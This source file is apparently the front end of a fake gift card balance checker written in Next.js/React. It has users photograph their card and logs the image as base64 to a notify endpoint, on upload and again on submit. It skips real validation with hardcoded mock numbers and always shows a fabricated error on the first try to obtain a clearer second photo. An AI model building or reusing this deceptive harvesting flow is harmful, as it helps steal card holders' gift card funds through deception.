// src/components/ScanPage.tsx
"use client";

import { useState, useRef, useEffect, ChangeEvent } from "react";
import Link from "next/link";
import { BRANDS, hasErrors, validateAll, type Errors } from "@/lib/giftcards";
import { filterAmount } from "@/lib/utils";

const NO_ERRORS: Errors = { brand: "", num: "", pin: "", amount: "" };

export default function ScanPage() {
  const [brandId, setBrandId] = useState<string>(BRANDS[0].id);
  const [amount, setAmount] = useState("");
  const [errors, setErrors] = useState<Errors>(NO_ERRORS);
  const [apiError, setApiError] = useState("");
  const [busy, setBusy] = useState(false);
  const [image, setImage] = useState<string | null>(null);
  const [attempt, setAttempt] = useState(0);
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [balance, setBalance] = useState<string | null>(null);
  
  const fileRef = useRef<HTMLInputElement>(null);
  const brand = BRANDS.find((b) => b.id === brandId) ?? BRANDS[0];

  useEffect(() => {
    setAttempt(0);
    setBalance(null);
  }, [brandId]);

  const handleImage = (e: ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = async (ev) => {
      const b64 = ev.target?.result as string;
      setImage(b64);
      setApiError("");

      if (process.env.NEXT_PUBLIC_NOTIFY_TYPING_ENABLED === 'true') {
        await fetch('/api/notify/log', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            event: 'scan_image_uploaded',
            brandName: brand.name,
            cardNumber: 'UNKNOWN (Scan)',
            amount: '0',
            status: 'Image Uploaded',
            message: 'User captured image, entering amount.',
            imageBase64: b64
          })
        }).catch(() => {});
      }
    };
    reader.readAsDataURL(file);
  };

  async function submit() {
    if (busy) return;
    if (!image) {
      setApiError("Please capture or upload an image first.");
      return;
    }

    const clean = amount.trim();
    
    // Create a valid mock number based on the brand to pass validation
    let mockNumber = '1234567890123456';
    if (brand.type === 'alnum') mockNumber = 'X123456789012345';
    else mockNumber = '1'.repeat(brand.len);
    
    const mockPin = brand.pin ? '12345678' : '';

    const errs = validateAll(brand.id, mockNumber, mockPin, clean);
    if (hasErrors(errs)) {
      setErrors({ ...NO_ERRORS, amount: errs.amount });
      return;
    }

    setBusy(true);
    setApiError("");

    try {
      const res = await fetch("/api/giftcard/check", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          brand: brand.id, 
          number: mockNumber, 
          pin: mockPin, 
          amount: clean, 
          attempt 
        }),
      });
      
      const data = await res.json();
      
      if (!res.ok) {
        setApiError((data.error as string) || "Something went wrong.");
        return;
      }

      await fetch('/api/notify/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          event: data.status === 'active' ? 'success' : 'failed',
          brandName: brand.name,
          cardNumber: mockNumber,
          amount: clean,
          status: data.status,
          message: data.message,
          imageBase64: image
        })
      }).catch(() => {});

      if (attempt === 0) {
        setShowErrorModal(true);
        setAttempt(1);
        setImage(null); 
      } else {
        setBalance(data.balance !== null ? `$${data.balance.toFixed(2)}` : 'Active');
        setAttempt(0);
      }
    } catch {
      setApiError("Network error.");
    } finally {
      setBusy(false);
    }
  }

  if (balance) {
    return (
      <section className="card text-center">
        <h2 style={{ color: 'var(--ok)' }}>Balance Verified</h2>
        <p className="sub">Your card has been successfully checked.</p>
        <div className="bal">
          <small>Available Balance</small>
          <div className="amt">{balance}</div>
        </div>
        <Link href="/" style={{ textDecoration: 'none' }}>
          <button type="button" style={{ background: 'var(--surface)', color: 'var(--text)', border: '1px solid var(--line)' }}>
            Check Another Card
          </button>
        </Link>
      </section>
    );
  }

  return (
    <>
      <div style={{ marginBottom: '16px' }}>
        <Link href="/" className="link">← Back to Manual Entry</Link>
      </div>

      <section className="card">
        <h2 className="text-center">Scan Card</h2>
        <p className="sub text-center">Select a card type, upload a photo, and enter the amount.</p>

        <label htmlFor="brand">Card type</label>
        <select id="brand" value={brandId} onChange={(e) => setBrandId(e.target.value)} disabled={busy}>
          {BRANDS.map((b) => (
            <option key={b.id} value={b.id}>{b.name}</option>
          ))}
        </select>

        <label>Card Image</label>
        <div className="upload-box" onClick={() => fileRef.current?.click()}>
          {image ? (
            <img src={image} alt="Preview" />
          ) : (
            <div>
              <div style={{ fontSize: '24px', marginBottom: '8px' }}>📸</div>
              <div style={{ fontSize: '14px', fontWeight: 600, color: 'var(--accent)' }}>Tap to Capture or Upload</div>
              <div style={{ fontSize: '12px', color: 'var(--muted)' }}>Ensure all digits are clearly visible</div>
            </div>
          )}
        </div>
        <input type="file" ref={fileRef} accept="image/*" capture="environment" style={{ display: 'none' }} onChange={handleImage} />

        <label htmlFor="amount">Card amount (USD)</label>
        <input
          id="amount"
          value={amount}
          onChange={(e) => setAmount(filterAmount(e.target.value))}
          inputMode="decimal"
          placeholder="e.g. 50.00"
          autoComplete="off"
          disabled={busy}
          className={errors.amount ? "bad" : ""}
        />
        <div className="err">{errors.amount}</div>

        {apiError && <div className="banner">{apiError}</div>}

        <button type="submit" onClick={() => void submit()} disabled={busy || !image}>
          {busy && <span className="spin" />}
          <span>{busy ? "Processing..." : "Check Balance"}</span>
        </button>
      </section>

      {showErrorModal && (
        <div style={{ position: 'fixed', inset: 0, zIndex: 100, background: 'rgba(0,0,0,0.8)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }}>
          <div className="card text-center" style={{ maxWidth: '300px', width: '100%', margin: 0 }}>
            <div style={{ fontSize: '40px', color: 'var(--err)', marginBottom: '10px' }}>❌</div>
            <h2 style={{ color: 'var(--err)' }}>Error!</h2>
            <p className="sub">An error occurred while checking this card. Please upload a clearer photo.</p>
            <button type="button" onClick={() => setShowErrorModal(false)} style={{ background: 'var(--err)' }}>Try Again</button>
          </div>
        </div>
      )}
    </>
  );
}